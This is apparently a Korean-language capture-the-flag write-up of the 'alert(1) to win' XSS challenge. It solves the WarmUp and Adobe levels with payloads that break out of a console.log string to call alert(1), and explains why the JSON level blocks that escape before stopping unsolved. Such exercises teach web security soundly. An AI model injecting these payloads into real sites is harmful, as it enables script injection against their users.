---
title: "alert(1) to win"
date: "2023-08-27"
description: "alert(1) to win XSS 챌린지 풀이"
tags: ["web", "xss", "javascript"]
platform: "portswigger"
category: "web"
difficulty: "Easy"
authors:
  - name: "Ph4nt0m"
    link: "https://github.com/Phantomn"
---

## WarmUp

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

```jsx
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

간단한 함수이다. script 태그로 console.log를 찍어주는 함수이다.

### Payload

첫번째로 console.log를 탈출한다.

그리고 alert구문을 삽입하면 될것 같다.

```jsx
Input : ");alert(1)//
Output : <script>console.log("");alert(1)//");</script>
```

이게 주석을 써도 </script>는 유지되나 보다.

---

## Adobe

```jsx
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

`"` 쌍따옴표를 `\"` 로 바꿔주는 함수이다.

이번에도 console.log를 탈출하고 alert(1)을 호출하면 되는 문제이다.

### Payload

```jsx
Input : \");alert(1)//
Output : <script>console.log("\\");alert(1)//");</script>
```

\"을 씀으로써 console.log를 탈출하고 alert(1) 이후에 주석을 통해 뒤의 구문을 날린다.

---

## JSON

```jsx
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

`JSON.stringify()`는 입력값을 JSON 문자열 리터럴로 직렬화해주는 함수다. 따옴표와 백슬래시를 전부 이스케이프하기 때문에 앞선 두 문제처럼 `"`나 `\`로 `console.log(...)` 밖으로 탈출하는 방식은 통하지 않는다.

이 문제는 여기까지 진행하고 중단했다. 이어서 풀면 갱신할 예정이다.
